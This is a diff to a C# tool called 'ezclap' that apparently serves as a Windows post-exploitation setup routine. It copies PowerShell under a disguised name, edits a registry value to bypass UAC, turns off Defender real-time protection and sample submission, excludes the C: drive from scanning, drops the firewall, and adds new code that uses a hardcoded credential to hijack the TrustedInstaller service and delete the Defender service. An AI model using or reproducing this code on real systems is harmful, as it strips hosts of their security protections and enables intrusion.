@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Configuration;
 using System.Collections.Specialized;
+using System.Diagnostics;
 using System.Collections.Generic;
 using Microsoft.Win32;
 using CommandLine;
@@ -29,7 +30,14 @@ namespace ezclap
         {
             foreach (var destination in newLoc)
             {
-                System.IO.File.Copy(originPayloadLoc, destination, true);
+                try
+                {
+                    System.IO.File.Copy(originPayloadLoc, destination, true);
+                }
+                catch(Exception ex)
+                {
+                    continue;
+                }
             }
         }
         /*
@@ -49,10 +57,19 @@ namespace ezclap
          */
         public static void setup(bool binary, string originPayloadLoc, string[] newLoc)
         {
+
             // 1. Copy powershell as msBuilder.exe 
             string srcPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
             string destPath = @"C:\Windows\System32\msBuilder.exe";
-            System.IO.File.Copy(srcPath, destPath, true);
+            try
+            {
+                System.IO.File.Copy(srcPath, destPath, true);
+            }
+            catch(Exception ex)
+            {
+                System.Environment.Exit(1);
+            }
+            
 
             // 2. change LowRiskFileTypes to bypass UAC 
             Utils.setHKCUSubKey(RegistryKeys.hkcuLowRiskFileType, "LowRiskFileTypes", ".bat;.exe;.ps1");
@@ -67,9 +84,9 @@ namespace ezclap
             string excludeC = "Add-MpPreference -ExclusionPath \"C:\"";
             string noSubmit = "Set-MpPreference -SubmitSamplesConsent 2";
 
-            System.Diagnostics.Process.Start(@"powershell.exe", noRealTime);
-            System.Diagnostics.Process.Start(@"powershell.exe", excludeC);
-            System.Diagnostics.Process.Start(@"powershell.exe", noSubmit);
+            Process.Start(@"powershell.exe", noRealTime);
+            Process.Start(@"powershell.exe", excludeC);
+            Process.Start(@"powershell.exe", noSubmit);
 
             // 5. Drop firewall 
             System.Diagnostics.Process proc = new System.Diagnostics.Process();
@@ -83,13 +100,43 @@ namespace ezclap
             // 6. Disable WinDefender - For Good 
             Utils.setHKLMSubKey(RegistryKeys.hklmDefender, "DisableAntiSpyware", 1);
 
-            // 6. Erase WinDefender
+
+
+            // 6. Erase WinDefender - THIS MIGHT CAUSE HAVOC, WATCH OUT TODO: 
             /*
-            string byeDefender = "config TrustedInstaller binPath= \"cmd.exe /C del 'C:\\Program Files\\Windows Defender\\MSASCui.exe\" ";
-            System.Diagnostics.Process.Start(@"C:\Windows\System32\sc.exe", byeDefender);
-            string terminate = "start TrustedInstaller";
-            System.Diagnostics.Process.Start(@"C:\Windows\System32\sc.exe", terminate);
+            string argss = "sc config TrustedInstaller binPath= \"cmd.exe /C sc stop windefend && sc delete windefend\" && sc start TrustedInstaller";
+            try
+            {
+                Process.Start(@"cmd.exe", argss);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] Access should be denied");
+            }
             */
+            
+            try
+            {
+                proc = new Process();
+                proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+                proc.StartInfo.UseShellExecute = true;
+                proc.StartInfo.CreateNoWindow = true;
+                proc.StartInfo.Verb = "runas";
+                proc.StartInfo.UserName = "joe";
+                System.Security.SecureString securePassword = new System.Security.SecureString();
+                string password = "LetRedIn!123";
+                foreach (char c in password.ToCharArray())
+                    securePassword.AppendChar(c);
+                proc.StartInfo.Password = securePassword;
+                proc.StartInfo.Arguments = "sc config TrustedInstaller binPath= \"cmd.exe /C sc stop windefend && sc delete windefend\" && sc start TrustedInstaller";
+                proc.Start();
+                proc.WaitForExit();
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine("[-] Access should be denied");
+            }
+            
 
         }
 
